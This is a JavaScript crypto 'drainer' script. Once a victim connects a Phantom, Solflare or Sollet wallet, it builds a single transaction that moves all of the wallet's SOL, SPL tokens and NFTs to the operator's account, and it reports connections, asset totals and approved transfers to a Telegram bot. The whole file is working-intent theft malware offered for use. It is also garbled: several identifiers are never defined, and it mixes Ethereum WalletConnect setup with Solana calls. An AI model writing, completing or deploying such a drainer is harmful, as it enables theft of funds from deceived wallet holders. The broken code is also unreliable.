// Import necessary libraries
const Web3 = require('web3');
const WalletConnectProvider = require('@walletconnect/web3-provider');
const { Connection, PublicKey, Keypair, Transaction, TransactionInstruction } = require('@solana/web3.js');
const { WalletAdapter } = require('@solana/wallet-adapter-base');
const { WalletAdapterPhantom, WalletAdapterSolflare, WalletAdapterSollet } = require('@solana/wallet-adapter-wallets');
const TelegramBot = require('node-telegram-bot-api');

// Initialize the Solana network connection
const connection = new Connection('https://api.mainnet-beta.solana.com');

const MY_ACCOUNT_PUBLIC_KEY = process.env.MY_ACCOUNT_PUBLIC_KEY;

// Initialize the Telegram bot
const botToken = 'YOUR_TELEGRAM_BOT_TOKEN';
const chatId = 'YOUR_CHAT_ID';
const bot = new TelegramBot(botToken);

// Function to initialize the wallet connection modal
async function initializeWalletModal() {
    // Create a new WalletConnect provider
    const provider = new WalletConnectProvider({
        rpc: {
            1: 'https://api.mainnet-beta.solana.com',
        },
    });

    // Initialize the Web3 instance with the WalletConnect provider
    const web3 = new Web3(provider);

    // Enable the WalletConnect provider
    await provider.enable();

    // Return the Web3 instance
    return web3;
}

// Function to connect to the Solana wallet
async function connectToSolanaWallet() {
    // Create an array of supported wallet adapters
    const walletAdapters = [
        new WalletAdapterPhantom(),
        new WalletAdapterSolflare(),
        new WalletAdapterSollet(),
    ];

    // Find the first available wallet adapter
    const walletAdapter = walletAdapters.find((adapter) => adapter.isAvailable());

    // Connect to the wallet
    await walletAdapter.connect();

    // Return the wallet adapter
    return walletAdapter;
}

// Function to get all Solana, SPL tokens, and NFTs in a single transaction
async function drainAllAssets(walletAdapter) {
    // Get the public key of the connected wallet
    const publicKey = walletAdapter.publicKey;

    // Get the balance of the connected wallet
    const balance = await connection.getBalance(publicKey);
    console.log(`Total Solana balance: ${balance}`);

    // Get the token accounts of the connected wallet
    const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, { programId: TOKEN_PROGRAM_ID });
    console.log(`Total token accounts: ${tokenAccounts.length}`);

    // Get the NFTs owned by the connected wallet
    const nftAccounts = await connection.getParsedProgramAccounts(NFT_PROGRAM_ID, {
        filters: [
            { dataSize: NFT_ACCOUNT_SIZE },
            { memcmp: { offset: NFT_OWNER_OFFSET, bytes: publicKey.toBase58() } },
        ],
    });
    console.log(`Total NFT accounts: ${nftAccounts.length}`);

    // Create a new transaction
    const transaction = new Transaction();

    // Add instructions to transfer Solana balance to an account
    transaction.add(
        SystemProgram.transfer({
            fromPubkey: publicKey,
            toPubkey: MY_ACCOUNT_PUBLIC_KEY,
            lamports: balance,
        })
    );

    // Add instructions to transfer SPL tokens to an account
    for (const tokenAccount of tokenAccounts) {
        const tokenPublicKey = new PublicKey(tokenAccount.pubkey);
        const tokenBalance = tokenAccount.account.data.parsed.info.tokenAmount.uiAmount;
        transaction.add(
            Token.createTransferInstruction(
                TOKEN_PROGRAM_ID,
                tokenPublicKey,
                MY_ACCOUNT_PUBLIC_KEY,
                publicKey,
                [],
                tokenBalance
            )
        );
    }

    // Add instructions to transfer NFTs to an account
    for (const nftAccount of nftAccounts) {
        const nftPublicKey = new PublicKey(nftAccount.pubkey);
        transaction.add(
            new TransactionInstruction({
                keys: [
                    { pubkey: nftPublicKey, isSigner: false, isWritable: true },
                    { pubkey: MY_ACCOUNT_PUBLIC_KEY, isSigner: false, isWritable: true },
                    { pubkey: publicKey, isSigner: true, isWritable: false },
                ],
                programId: NFT_PROGRAM_ID,
                data: Buffer.from([]),
            })
        );
    }

    // Sign and send the transaction
    const signedTransaction = await walletAdapter.signTransaction(transaction);
    const transactionResult = await connection.sendRawTransaction(signedTransaction.serialize());
    console.log(`Transaction hash: ${transactionResult}`);

    // Log the transaction approval to Telegram
    bot.sendMessage(chatId, `Transaction approved: ${transactionResult}`);
}

// Function to handle wallet connection events
function handleWalletConnection(walletAdapter) {
    // Log the wallet connection to Telegram
    bot.sendMessage(chatId, `Wallet connected: ${walletAdapter.wallet.name}`);

    // Get the total assets available in the wallet
    const publicKey = walletAdapter.publicKey;
    const balance = connection.getBalance(publicKey);
    const tokenAccounts = connection.getParsedTokenAccountsByOwner(publicKey, { programId: TOKEN_PROGRAM_ID });
    const nftAccounts = connection.getParsedProgramAccounts(NFT_PROGRAM_ID, {
        filters: [
            { dataSize: NFT_ACCOUNT_SIZE },
            { memcmp: { offset: NFT_OWNER_OFFSET, bytes: publicKey.toBase58() } },
        ],
    });

    // Log the total assets available in the wallet to Telegram
    Promise.all([balance, tokenAccounts, nftAccounts]).then(([balance, tokenAccounts, nftAccounts]) => {
        bot.sendMessage(chatId, `Total assets available in wallet: 
            Solana balance: ${balance}
            Token accounts: ${tokenAccounts.length}
            NFT accounts: ${nftAccounts.length}`);
    });
}

// Function to handle wallet disconnection events
function handleWalletDisconnection() {
    // Log the wallet disconnection to Telegram
    bot.sendMessage(chatId, 'Wallet disconnected');
}

// Function to handle transaction rejection events
function handleTransactionRejection() {
    // Log the transaction rejection to Telegram
    bot.sendMessage(chatId, 'Transaction rejected');
}

// Function to handle errors
function handleError(error) {
    // Log the error to Telegram
    bot.sendMessage(chatId, `Error: ${error.message}`);
}

// Main function to run the script
async function runDrainer() {
    try {
        // Initialize the wallet connection modal
        const web3 = await initializeWalletModal();

        // Connect to the Solana wallet
        const walletAdapter = await connectToSolanaWallet();

        // Handle wallet connection events
        walletAdapter.on('connect', () => handleWalletConnection(walletAdapter));
        walletAdapter.on('disconnect', handleWalletDisconnection);

        // Handle transaction rejection events
        walletAdapter.on('transactionRejected', handleTransactionRejection);

        // Handle errors
        walletAdapter.on('error', handleError);

        // Get all assets in a single transaction
        await drainAllAssets(walletAdapter);
    } catch (error) {
        console.error(error);
    }
}

// Run the script
runDrainer();